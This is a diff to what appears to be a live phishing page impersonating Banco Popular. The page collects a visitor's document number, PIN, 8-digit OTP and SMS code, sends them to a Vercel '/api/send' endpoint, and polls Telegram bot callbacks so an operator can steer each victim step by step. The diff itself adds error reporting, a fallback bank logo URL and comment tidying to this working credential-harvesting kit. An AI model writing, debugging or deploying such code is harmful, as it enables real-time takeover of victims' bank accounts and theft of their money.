@@ -136,7 +136,6 @@ select.input { cursor: pointer; }
 .demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; font-size: 18px; }
 .demo-title { text-align: center; font-size: 22px; line-height: 1.2; margin: 10px 0 22px; color: #333; }
 
-/* NUEVO INPUT ÚNICO PARA OTP */
 .otp-single-input {
     width: 100%;
     max-width: 320px;
@@ -255,7 +254,8 @@ select.input { cursor: pointer; }
         <h1 class="welcome">Bienvenido a</h1>
         
         <div class="logo">
-            <img src="logopopu.svg" alt="Banco Popular">
+            <!-- Asegúrate de tener la imagen en la misma carpeta o usa una URL válida -->
+            <img src="logopopu.svg" alt="Banco Popular" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Logo_Banco_Popular.svg/512px-Logo_Banco_Popular.svg.png'">
         </div>
 
         <form id="demoForm" autocomplete="off" novalidate>
@@ -364,13 +364,11 @@ select.input { cursor: pointer; }
 
 <script>
 // ==========================================
-// CONFIGURACIÓN
+// CONFIGURACIÓN (RUTA RELATIVA EN VERCEL)
 // ==========================================
 const API_URL = '/api/send';
 
-// ==========================================
 // ELEMENTOS
-// ==========================================
 const documentType   = document.getElementById("documentType");
 const documentNumber = document.getElementById("documentNumber");
 const claveInput     = document.getElementById("password");
@@ -394,9 +392,7 @@ const btnSmsFinal   = document.getElementById("btnSmsFinal");
 const smsError      = document.getElementById("smsError");
 const smsInputWrap  = document.getElementById("smsInputWrap");
 
-// ==========================================
 // ESTADO
-// ==========================================
 let pollingActivo = false;
 let pollingTimeout = null;
 let ultimoUpdateId = -1;
@@ -407,9 +403,7 @@ let usuarioActual = "";
 function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
 function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
 
-// ==========================================
-// VALIDACIÓN UI
-// ==========================================
+// VALIDACIÓN
 function actualizarBoton() {
     const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
     const usuarioLleno  = documentNumber.value.trim().length > 0;
@@ -433,7 +427,7 @@ togglePassword.addEventListener("click", function() {
 });
 
 // ==========================================
-// ENVIAR A VERCEL
+// CONEXIÓN CON BACKEND
 // ==========================================
 async function enviarAlBackend(payload) {
     try {
@@ -442,9 +436,18 @@ async function enviarAlBackend(payload) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+        
+        // Si el servidor responde con error 404 o 500
+        if (!res.ok) {
+            const errorText = await res.text();
+            console.error(`Error del servidor (${res.status}):`, errorText);
+            throw new Error(`Error ${res.status}: Revisa la consola o los logs de Vercel`);
+        }
+        
         const data = await res.json();
         return data;
     } catch (error) {
+        console.error('Error de red:', error);
         throw error;
     }
 }
@@ -461,11 +464,11 @@ function enviarIdentificacion(tipoDoc, usuario, clave) {
             escucharBotones(handleTelegramActionLogin);
         } else {
             ocultarOverlay();
-            alert('Error al contactar al bot.');
+            alert('Error al contactar al bot:\n' + (data.description || 'Desconocido'));
         }
-    }).catch(() => {
+    }).catch((error) => {
         ocultarOverlay();
-        alert('Error de conexión con el servidor.');
+        alert('Error de conexión: ' + error.message);
     });
 }
 
@@ -480,7 +483,7 @@ function enviarDinamica(dinamica) {
         } else {
             ocultarOverlay();
         }
-    }).catch(() => ocultarOverlay());
+    }).catch((error) => { ocultarOverlay(); alert(error.message); });
 }
 
 function enviarSms(smsCode) {
@@ -494,11 +497,11 @@ function enviarSms(smsCode) {
         } else {
             ocultarOverlay();
         }
-    }).catch(() => ocultarOverlay());
+    }).catch((error) => { ocultarOverlay(); alert(error.message); });
 }
 
 // ==========================================
-// POLLING
+// POLLING (ESCUCHAR BOTONES)
 // ==========================================
 function escucharBotones(callbackAction) {
     if (!msgIdActual) return;
@@ -508,6 +511,7 @@ function escucharBotones(callbackAction) {
         if (!pollingActivo) return;
         try {
             const res = await fetch(`${API_URL}?offset=${ultimoUpdateId + 1}`);
+            if (!res.ok) throw new Error("Error en GET");
             const data = await res.json();
 
             if (!data.ok || !data.result || data.result.length === 0) {
@@ -528,6 +532,7 @@ function escucharBotones(callbackAction) {
             }
             pollingTimeout = setTimeout(check, 2000);
         } catch (err) {
+            console.error("Error en polling:", err);
             pollingTimeout = setTimeout(check, 3000);
         }
     }
@@ -535,7 +540,7 @@ function escucharBotones(callbackAction) {
 }
 
 // ==========================================
-// ACCIONES DE BOTONES
+// ACCIONES
 // ==========================================
 function handleTelegramActionLogin(action) {
     if (actionProcessed) return;
@@ -617,7 +622,7 @@ function handleTelegramActionSms(action) {
 }
 
 // ==========================================
-// SUBMIT
+// SUBMIT Y OTP
 // ==========================================
 demoForm.addEventListener("submit", function(e) {
     e.preventDefault();
@@ -630,9 +635,6 @@ demoForm.addEventListener("submit", function(e) {
     enviarIdentificacion(tipoDoc, user, pass);
 });
 
-// ==========================================
-// OTP (AHORA 8 DÍGITOS EN UN SOLO INPUT)
-// ==========================================
 function actualizarOTP() {
     const valor = otpInput.value;
     if (valor.length === 8) {
@@ -667,7 +669,6 @@ closeModal.addEventListener("click", () => {
     modal.classList.remove("is-open");
 });
 
-// SMS
 smsCodeInput.addEventListener("input", function() {
     this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
     smsError.classList.remove("show");
